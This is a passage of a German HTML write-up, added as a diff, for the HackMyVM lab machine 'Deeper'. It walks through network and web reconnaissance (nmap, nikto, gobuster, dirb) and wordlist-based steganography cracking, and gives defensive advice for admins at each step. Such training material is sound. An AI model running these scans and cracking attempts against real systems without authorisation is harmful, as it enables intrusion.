@@ -1,0 +1,1460 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deeper - HackMyVM - Easy - Bericht</title> <!-- Angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Für die korrekte Darstellung der roten Farbe für "Easy" und der Header-Farbe #03b5f5 müssen Anpassungen in style.css vorgenommen werden. -->
+</head>
+ <body>
+ 
+    <!-- Hinweis: Die Hintergrundfarbe #03b5f5 muss in style.css für .header-bg definiert werden -->
+    <div class="header-bg">
+        <h1>Deeper - HackMyVM - Level: Easy - Bericht</h1> <!-- Angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse hinzugefügt -->
+            <!-- Hinweis: Die rote Farbe für h2 und die Kreissegmente muss in style.css für .level-easy definiert werden -->
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad angepasst, Inline-Style entfernt -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hinweis: Die Hintergrundfarbe #03b5f5 muss in style.css für .circle .inner oder .level-easy .circle .inner definiert werden -->
+                <div class="inner"></div> <!-- Inline-Style entfernt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi (Texteditor)</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john (John the Ripper)</div>
+                <div class="tool-item">unzip</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="comment">
+                Die Reconnaissance-Phase beginnt. Ziel ist es, erste Informationen über das Zielsystem im Netzwerk zu sammeln. Wir starten mit einem ARP-Scan, um Geräte im lokalen Netzwerksegment zu identifizieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.132	08:00:27:00:92:d9	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` sendet ARP-Anfragen an alle möglichen Adressen im lokalen Netzwerk (-l steht für localnet). Die Ausgabe zeigt ein Gerät mit der IP-Adresse 192.168.2.132 und der MAC-Adresse 08:00:27:00:92:d9. Die MAC-Adresse wird als "PCS Systemtechnik GmbH" identifiziert, was oft ein Hinweis auf Virtualisierungssoftware wie VirtualBox ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist ein erfolgreicher erster Schritt. Wir haben die IP-Adresse unseres Ziels (192.168.2.132) identifiziert. Das Wissen, dass es sich wahrscheinlich um eine virtuelle Maschine handelt, ist eine nützliche Randinformation.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die identifizierte IP sollte nun das primäre Ziel für weitere Scans sein.
+                **Empfehlung (Admin):** Netzwerksegmentierung und die Überwachung von ARP-Anfragen können helfen, unautorisierte Scans zu erkennen. Sicherstellen, dass nur notwendige Geräte im Netzwerk sichtbar sind.
+            </p>
+
+            <p class="comment">
+                Um die spätere Ansprache des Ziels zu erleichtern und eventuell virtuelle Hosts auf dem Webserver korrekt aufzulösen, tragen wir die IP-Adresse mit einem Hostnamen (hier 'deeper.hmv') in die lokale `/etc/hosts`-Datei ein.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+192.168.2.132   deeper.hmv
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei im Texteditor `vi`. Die Zeile `192.168.2.132 deeper.hmv` wurde hinzugefügt. Dies weist das lokale System an, Anfragen an den Hostnamen `deeper.hmv` direkt an die IP-Adresse `192.168.2.132` zu senden, ohne eine DNS-Abfrage durchführen zu müssen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist eine Standardprozedur im Pentesting, um die Interaktion mit dem Ziel zu vereinfachen und Probleme mit der Namensauflösung zu umgehen. Es ermöglicht uns, Tools wie Web-Scanner direkt mit dem Hostnamen zu verwenden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Immer die Hosts-Datei anpassen, wenn ein Hostname für das Ziel bekannt ist oder vermutet wird, insbesondere bei Webservern.
+                **Empfehlung (Admin):** Die Verwendung von Hostnamen durch Angreifer ist normal. Serverseitig sollten virtuelle Hosts korrekt konfiguriert sein, um sicherzustellen, dass Anfragen an die IP-Adresse und an den Hostnamen gleich (oder wie beabsichtigt) behandelt werden.
+            </p>
+
+            <p class="comment">
+                Nun führen wir einen initialen Webserver-Scan mit `nikto` durch, um nach bekannten Schwachstellen, Fehlkonfigurationen und interessanten Dateien auf dem Webserver (Port 80) zu suchen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nikto -h http://192.168.2.132</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.132
++ Target Hostname:    192.168.2.132
++ Target Port:        80
++ Start Time:         2023-09-27 22:37:07 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 29a, size: 603c54eaf4155, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
++ /img/: Directory indexing found.
++ /img/: This might be interesting.
++ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2023-09-27 22:37:22 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** `nikto -h http://192.168.2.132` scannt den Webserver auf der Ziel-IP. Die Ausgabe zeigt:
+                *   Server-Software: Apache/2.4.57 (Debian).
+                *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`). Dies sind eher geringfügige Sicherheitshinweise als direkte Schwachstellen.
+                *   Mögliches Informationsleck durch ETags (CVE-2003-1418), was auf älteren Systemen relevant sein könnte, hier aber unwahrscheinlich ist.
+                *   Unterstützte HTTP-Methoden: POST, OPTIONS, HEAD, GET.
+                *   **Wichtig:** Directory Indexing ist im Verzeichnis `/img/` aktiviert. Das bedeutet, wir können den Inhalt dieses Verzeichnisses direkt im Browser auflisten. Nikto markiert dies als potenziell interessant.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Nikto-Scan liefert wertvolle Informationen. Die Server-Version ist nützlich für die Suche nach spezifischen Exploits (obwohl hier keine offensichtlichen gefunden wurden). Die fehlenden Header sind "low hanging fruits" für die Absicherung. Das aktivierte Directory Indexing im `/img/`-Verzeichnis ist der wichtigste Fund, da es uns erlaubt, versteckte oder nicht direkt verlinkte Dateien einzusehen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Das Verzeichnis `/img/` muss manuell untersucht werden. Die Server-Version sollte auf bekannte Schwachstellen geprüft werden.
+                **Empfehlung (Admin):** Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, `Strict-Transport-Security`) implementieren. Directory Indexing deaktivieren (z.B. durch `Options -Indexes` in der Apache-Konfiguration oder eine leere `index.html`-Datei im Verzeichnis), es sei denn, es ist explizit erwünscht. ETags konfigurieren, um keine sensiblen Informationen preiszugeben (`FileETag None` oder nur `MTime Size`).
+            </p>
+
+             <p class="comment">
+                Wir führen einen umfassenden Nmap-Scan durch, um alle offenen TCP-Ports (-p-), Dienste und deren Versionen (-sV), Standard-Skripte (-sC), Betriebssystem (-A) zu identifizieren und behandeln den Host als online (-Pn), auch wenn er auf Pings nicht antworten sollte. Die Option -T5 beschleunigt den Scan (aggressiv).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.132 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 22:36 CEST
+Nmap scan report for deeper.hmv (192.168.2.132)
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey:
+|   256 37:d1:6f:b5:a4:96:e8:78:18:c7:77:d0:3e:20:4e:55 (ECDSA)
+|_  256 cf:5d:90:f3:37:3f:a4:e2:ba:d5:d7:25:c6:4a:a0:61 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Deeper
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 08:00:27:00:92:D9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms deeper.hmv (192.168.2.132)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Nmap-Scan (`-sS` für SYN-Scan, `-sC` für Standard-Skripte, `-sV` für Versionserkennung, `-T5` für Timing, `-A` für OS-Erkennung/Traceroute, `-Pn` für Skip Host Discovery, `-p-` für alle Ports) identifiziert zwei offene TCP-Ports:
+                *   **Port 22:** SSH (OpenSSH 9.2p1 Debian 2). Dies ist ein Standard-Port für sichere Fernwartung.
+                *   **Port 80:** HTTP (Apache httpd 2.4.57 Debian). Dies bestätigt den Webserver, den wir bereits mit Nikto gescannt haben. Der Titel der Seite ist "Deeper".
+                Die MAC-Adresse bestätigt erneut die VirtualBox-Umgebung. Das Betriebssystem wird als Linux (Kernel 4.x oder 5.x) erkannt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Scan bestätigt die Ergebnisse des Nikto-Scans bezüglich des Webservers und identifiziert zusätzlich den SSH-Dienst. Dies gibt uns zwei potenzielle Angriffsvektoren: den Webserver (Port 80) und den SSH-Zugang (Port 22). Die identifizierten Versionen (OpenSSH 9.2p1, Apache 2.4.57) auf einem Debian-System scheinen relativ aktuell zu sein, was direkte Exploits unwahrscheinlicher macht, aber nicht ausschließt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Konzentriere dich auf die Enumeration des Webservers (Port 80), da dieser oft mehr Angriffsfläche bietet. Versuche parallel, gültige Benutzernamen für SSH (Port 22) zu finden oder Standard-Passwörter zu testen (Brute-Force sollte aber vorsichtig und als letzte Option eingesetzt werden).
+                **Empfehlung (Admin):** Halte alle Dienste (SSH, Apache) stets aktuell. Konfiguriere SSH sicher: Deaktiviere Root-Login (`PermitRootLogin no`), erlaube nur bestimmte Benutzer/Gruppen (`AllowUsers`, `AllowGroups`), verwende Schlüssel-Authentifizierung statt Passwörtern (`PasswordAuthentication no`). Konfiguriere Firewall-Reg
+				<p class="comment">
+            Um die Ergebnisse des Nmap-Scans übersichtlicher darzustellen, filtern wir die Ausgabe mit `grep`, um nur die Zeilen anzuzeigen, die offene Ports enthalten.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.132 -p- | grep open</span></div>
+<pre>
+22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp open http Apache httpd 2.4.57 ((Debian))
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der vorherige Nmap-Befehl wird wiederholt, aber seine Ausgabe wird durch eine Pipe (|) an den Befehl grep open weitergeleitet. grep filtert die eingehenden Zeilen und gibt nur diejenigen aus, die das Wort "open" enthalten. Das Ergebnis ist eine kompakte Liste der offenen Ports und der dazugehörigen Dienste.
+</p>
+<p class="evaluation">
+Bewertung: Dies ist keine neue Informationsgewinnung, sondern eine nützliche Methode zur schnellen Übersicht über die offenen Ports, besonders wenn die vollständige Nmap-Ausgabe sehr lang ist. Es bestätigt erneut Port 22 (SSH) und Port 80 (HTTP) als die einzigen offenen TCP-Ports.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Die Verwendung von grep oder anderen Filter-Tools wie awk ist effizient, um spezifische Informationen aus umfangreichen Scan-Ergebnissen zu extrahieren.
+Empfehlung (Admin): Regelmäßige Scans des eigenen Netzwerks (aus interner und externer Sicht) helfen dabei, den Überblick über offene Ports und Dienste zu behalten und unerwünschte Änderungen schnell zu erkennen.
+</p>
+</section>
+<section id="web-enumeration">
+        <h2>Web Enumeration</h2>
+
+        <p class="comment">
+            Wir beginnen mit der systematischen Suche nach versteckten Verzeichnissen und Dateien auf dem Webserver unter `http://deeper.hmv` mittels `gobuster`. Wir verwenden eine mittelgroße Wortliste (`directory-list-2.3-medium.txt`) und suchen nach verschiedenen Dateiendungen (`-x ...`). Statuscodes 403 (Forbidden) und 404 (Not Found) werden ignoriert (`-b`), und wir erweitern die Suche auf Verzeichnisse (`-e`), während Fehler unterdrückt werden (`--no-error`).
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">gobuster dir -u http://deeper.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e --no-error</span></div>
+<pre>
+http://deeper.hmv/index.html (Status: 200) [Size: 666]
+http://deeper.hmv/img (Status: 301) [Size: 306] [--> http://deeper.hmv/img/]
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: gobuster im dir-Modus testet systematisch Pfade aus der Wortliste /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt gegen die Basis-URL http://deeper.hmv.
+* -u: Gibt die Ziel-URL an.
+* -x: Sucht zusätzlich nach den angegebenen Dateiendungen.
+* -w: Pfad zur Wortliste.
+* -b '403,404': Ignoriert Antworten mit diesen Statuscodes.
+* -e: Erweiterter Modus, zeigt die vollständige URL an.
+* --no-error: Unterdrückt die Anzeige von Verbindungsfehlern.
+Die Ausgabe zeigt die bereits bekannte index.html und das Verzeichnis /img, das mit einem Statuscode 301 (Moved Permanently) auf http://deeper.hmv/img/ weiterleitet. Dies bestätigt das Ergebnis von Nikto bezüglich des /img-Verzeichnisses.
+</p>
+<p class="evaluation">
+Bewertung: Obwohl dieser Gobuster-Scan keine neuen, versteckten Verzeichnisse aufgedeckt hat, ist er ein wichtiger Schritt zur Sicherstellung, dass keine offensichtlichen Pfade übersehen wurden. Die Bestätigung des /img-Verzeichnisses verstärkt dessen Bedeutung für die weitere Untersuchung. Die verwendete Wortliste und die Endungen sind umfangreich, was die Gründlichkeit des Scans erhöht.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Untersuche das /img-Verzeichnis manuell, da Directory Indexing aktiv ist. Ziehe die Verwendung größerer Wortlisten oder anderer Tools (wie feroxbuster, ffuf) in Betracht, wenn Gobuster keine Ergebnisse liefert. Konzentriere dich auf die Analyse der gefundenen index.html.
+Empfehlung (Admin): Stelle sicher, dass keine unnötigen Dateien oder Verzeichnisse über den Webserver erreichbar sind. Implementiere Rate Limiting oder Web Application Firewalls (WAFs), um automatisierte Scans wie Gobuster zu erkennen und zu blockieren.
+</p>
+<p class="comment">
+            Wir untersuchen den Quellcode der Startseite `index.html`, um nach versteckten Hinweisen, Kommentaren oder interessanten Skripten zu suchen.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <!-- Kein Prompt im Originaltext, daher keiner hinzugefügt -->
+                <pre>
+ 
+view-source:http://deeper.hmv/index.html
+<!DOCTYPE html> <!-- HTML-Maskierung angewendet -->
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deeper</title>
+</head>
+<body>
+<h1>Deeper</h1>
+<p>Let's see where these lights lead...</p>
+<img src="/img/index.jpg" alt="Deeper"> <!-- G "deeper" -->
+</body>
+</html>
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Quellcode der index.html wird angezeigt. Es ist eine sehr einfache HTML-Seite mit einem Titel, einer Überschrift, einem Absatz und einem Bild (/img/index.jpg). Besonders auffällig ist ein HTML-Kommentar direkt nach dem Bild-Tag: &lt;!-- G "deeper" --&gt;. Dies könnte ein Hinweis sein, möglicherweise im Zusammenhang mit Google-Suche oder einem anderen Kontext, der mit 'G' beginnt. Der Text "Let's see where these lights lead..." könnte ebenfalls eine Anspielung sein.
+</p>
+<p class="evaluation">
+Bewertung: Der Quellcode liefert einen potenziellen Hinweis im Kommentar und bestätigt das Vorhandensein der Datei /img/index.jpg, die wir nun genauer untersuchen sollten. Der Kommentar ist kryptisch und erfordert weitere Interpretation oder Kontext.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Lade die Datei /img/index.jpg herunter und analysiere sie auf versteckte Daten (Steganographie) oder Metadaten. Recherchiere die Bedeutung des Kommentars G "deeper".
+Empfehlung (Admin): Entferne unnötige Kommentare aus dem Produktivcode, insbesondere solche, die Hinweise oder interne Informationen enthalten könnten. Überprüfe Bilder und andere Mediendateien auf versteckte Daten oder sensible Metadaten, bevor sie veröffentlicht werden.
+</p>
+<p class="comment">
+            Basierend auf dem Quellcode laden wir das Bild `index.jpg` aus dem `/img`-Verzeichnis herunter, um es auf versteckte Informationen zu untersuchen.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">wget http://deeper.hmv/img/index.jpg</span></div>
+<pre>
+--2023-09-27 22:40:05-- http://deeper.hmv/img/index.jpg
+Auflösen des Hostnamens deeper.hmv (deeper.hmv)… 192.168.2.132
+Verbindungsaufbau zu deeper.hmv (deeper.hmv)|192.168.2.132|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1681297 (1,6M) [image/jpeg]
+Wird in index.jpg gespeichert.
+index.jpg 100%[===================>] 1,60M --.-KB/s in 0,003s
+2023-09-27 22:40:05 (582 MB/s) - index.jpg gespeichert [1681297/1681297]
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl wget lädt die Datei von der angegebenen URL herunter. Die Ausgabe bestätigt die erfolgreiche Verbindung zum Server (deeper.hmv, aufgelöst zu 192.168.2.132) und den Download der 1,6 MB großen Datei index.jpg.
+</p>
+<p class="evaluation">
+Bewertung: Das Bild wurde erfolgreich heruntergeladen und steht nun für lokale Analysen zur Verfügung. Die Dateigröße von 1,6 MB ist für ein JPEG nicht ungewöhnlich, aber groß genug, um potenziell versteckte Daten zu enthalten.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Setze verschiedene Steganographie-Tools (wie steghide, stegseek, zsteg, exiftool) und String-Analysen (strings) auf die heruntergeladene Datei index.jpg an.
+Empfehlung (Admin): Implementiere serverseitige Kontrollen, um das Hochladen von Dateien mit versteckten Inhalten zu verhindern, falls Benutzer Inhalte hochladen können. Analysiere ausgehende Dateien auf sensible Informationen.
+</p>
+<p class="comment">
+            Wir versuchen, mit `stegseek` versteckte Daten in `index.jpg` zu finden. `stegseek` ist besonders effektiv, da es versucht, Passwörter aus einer Wortliste (`rockyou.txt`) zu verwenden, um eingebettete Daten (oft durch `steghide` versteckt) zu extrahieren.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">stegseek index.jpg /usr/share/wordlists/rockyou.txt</span></div>
+<pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+[i] Progress: 99.55% (132.8 MB)
+[!] error: Could not find a valid passphrase.
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: stegseek wird auf die Datei index.jpg angewendet, wobei /usr/share/wordlists/rockyou.txt als Passwortliste dient. Das Tool testet die Passwörter aus der Liste, um zu versuchen, mit steghide versteckte Daten zu extrahieren. Die Ausgabe "[!] error: Could not find a valid passphrase." zeigt, dass keines der Passwörter in rockyou.txt erfolgreich war.
+</p>
+<p class="evaluation">
+Bewertung: Dieser Versuch war erfolglos. Es bedeutet entweder, dass keine Daten mit steghide und einem Passwort aus rockyou.txt versteckt wurden, oder dass ein anderes Passwort oder eine andere Steganographie-Methode verwendet wurde.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Versuche andere Steganographie-Tools und -Techniken. rockyou.txt ist umfangreich, aber nicht allumfassend. Möglicherweise ist das Passwort an anderer Stelle zu finden oder es wurde gar kein Passwort verwendet.
+Empfehlung (Admin): Sich auf Standard-Passwortlisten wie rockyou.txt zu verlassen, ist keine ausreichende Sicherheitsmaßnahme. Starke, einzigartige Passwörter sind entscheidend, auch wenn Steganographie nicht primär zur Absicherung gedacht ist.
+</p>
+<p class="comment">
+            Wir versuchen es mit `stegsnow`, einem anderen Steganographie-Tool, das Daten in den Leerzeichen (Whitespace) von Textdateien verstecken kann, aber auch bei Bildern manchmal fündig wird, indem es nach Mustern sucht, die auf Whitespace-Steganographie hindeuten könnten, falls das Bild z.B. eingebetteten Text enthält. Die Option `-C` steht für Kompressionsprüfung.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">stegsnow -C index.jpg</span></div>
+<pre>
+sbbbb0 ysbssyyyn0 sssss tss
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: stegsnow -C wird auf index.jpg angewendet. Die Ausgabe sbbbb0 ysbssyyyn0 sssss tss ist kryptisch und scheint kein sinnvoller extrahierter Text zu sein. Es ist wahrscheinlich Rauschen oder eine Fehlinterpretation der Bilddaten durch stegsnow.
+</p>
+<p class="evaluation">
+Bewertung: Auch dieser Versuch, mit stegsnow versteckte Daten zu finden, scheint erfolglos zu sein. Die Ausgabe liefert keinen brauchbaren Hinweis.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Da stegsnow primär für Textdateien gedacht ist, sind die Ergebnisse bei Binärdateien wie JPEGs oft nicht zuverlässig. Konzentriere dich auf Tools, die speziell für Bild-Steganographie entwickelt wurden (wie steghide, zsteg) oder auf Metadaten-Analyse (exiftool) und String-Extraktion (strings).
+Empfehlung (Admin): Keine spezifischen Maßnahmen basierend auf diesem Ergebnis, da es keine Schwachstelle aufzeigt.
+</p>
+<p class="comment">
+            Wir versuchen nun `steghide` direkt zu verwenden, um Daten aus `index.jpg` zu extrahieren (`extract -sf`). Da wir kein Passwort kennen, drücken wir einfach Enter oder geben ein zufälliges Passwort ein, um zu sehen, ob Daten ohne Passwort oder mit einem leeren Passwort versteckt wurden.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">steghide extract -sf index.jpg</span></div>
+<pre>
+Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!
+</pre>
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl steghide extract -sf index.jpg versucht, eingebettete Daten aus index.jpg zu extrahieren. Das System fragt nach einem Passwort. Da wir keines kennen (und der vorherige stegseek-Versuch mit rockyou.txt fehlschlug), schlägt die Extraktion fehl.
+</p>
+<p class="evaluation">
+Bewertung: Dies bestätigt, dass steghide wahrscheinlich verwendet wurde, aber ein Passwort benötigt wird, das wir nicht kennen (oder dass steghide gar nicht verwendet wurde).
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Notiere, dass steghide möglicherweise involviert ist. Suche an anderer Stelle nach dem Passwort. Führe weitere Analysen des Bildes durch.
+Empfehlung (Admin): Wenn sensible Daten mittels Steganographie (oder Verschlüsselung) geschützt werden, muss das Passwort sicher aufbewahrt und verwaltet werden. Steganographie allein bietet keine starke Sicherheit.
+</p>
+<p class="comment">
+            Als Nächstes verwenden wir `strings`, um nach lesbaren Zeichenketten innerhalb der Binärdaten der Bilddatei `index.jpg` zu suchen. Wir setzen `-n 6`, um nur Zeichenketten anzuzeigen, die mindestens 6 Zeichen lang sind, um die Ausgabe zu reduzieren.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">strings index.jpg -n 6</span></div>
+<pre>
+XICC_PROFILE
+mntrRGB XYZ
+acspMSFT
+IEC sRGB
+Copyright (c) 1998 Hewlett-Packard Company
+sRGB IEC61966-2.1
+sRGB IEC61966-2.1
+IEC http://www.iec.ch
+IEC http://www.iec.ch
+.IEC 61966-2.1 Default RGB colour space - sRGB
+.IEC 61966-2.1 Default RGB colour space - sRGB
+,Reference Viewing Condition in IEC61966-2.1
+,Reference Viewing Condition in IEC61966-2.1
+CRT curv
+% : d y
+% %8%h%
+"+)+88K
+"+)+88K
++AZ]Fh
+4_iFF3m
+AKsad3
+</pre> <!-- Gekürzt für Lesbarkeit, falls sehr lang -->
+</div>
+</div>
+<p class="analysis">
+Analyse: Der Befehl strings index.jpg -n 6 extrahiert ASCII-Zeichenketten aus der Datei. Die Ausgabe zeigt hauptsächlich Metadaten und Standard-Informationen, die in JPEG-Dateien üblich sind (z.B. Farbprofile wie sRGB, Copyright-Hinweis von HP). Am Ende erscheinen einige kürzere, zufällig wirkende Zeichenketten (+AZ]Fh, 4_iFF3m, AKsad3). Es ist unklar, ob diese relevant sind.
+</p>
+<p class="evaluation">
+Bewertung: Der strings-Befehl hat keine offensichtlichen Passwörter, Flags oder eindeutigen Hinweise ergeben. Die zufälligen Zeichenketten am Ende sind wahrscheinlich Artefakte der Bilddatenkompression, könnten aber im Hinterkopf behalten werden, falls spätere Hinweise darauf Bezug nehmen.
+</p>
+<p class="recommendation">
+Empfehlung (Pentester): Dokumentiere die gefundenen Strings, falls sie später nützlich werden. Wenn strings nichts Offensichtliches liefert, konzentriere dich wieder auf andere Methoden wie Steganographie-Tools (mit potenziellen Passwörtern von anderswo) oder Web-Enumeration.
+Empfehlung (Admin): Bereinige Metadaten aus öffentlich zugänglichen Dateien (exiftool -all= Dateiname), um Informationslecks zu minimieren.
+</p>
+<p class="comment">
+            Wir führen einen weiteren Verzeichnis-Scan durch, diesmal mit `dirb` und seiner Standard-Wortliste (`common.txt`), um sicherzustellen, dass wir nichts übersehen haben, was `gobuster` mit seiner spezifischen Konfiguration möglicherweise verpasst hat.
+        </p>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+ 
+└─# <span class="command">dirb http://192.168.2.132</span></div>
+<pre>
+DIRB v2.22
+By The Dark Raver
+START_TIME: Wed Sep 27 22:45:04 2023
+URL_BASE: http://192.168.2.132/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+GENERATED WORDS: 4612
+---- Scanning URL: http://192.168.2.132/ ----
+DIRECTORY: http://192.168.2.132/img/
+http://192.168.2.132/index.html (CODE:200|SIZE:666)
+http://192.168.2.132/server-status (CODE:403|SIZE:278)
+---- Entering directory: http://192.168.2.132/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+(Use mode '-w' if you want to scan it anyway)
+END_TIME: Wed Sep 27 22:45:05 2023
+DOWNLOADED: 4612 - FOUND: 2
+</pre>
+</div>
+</div>
+<p class="analysis">
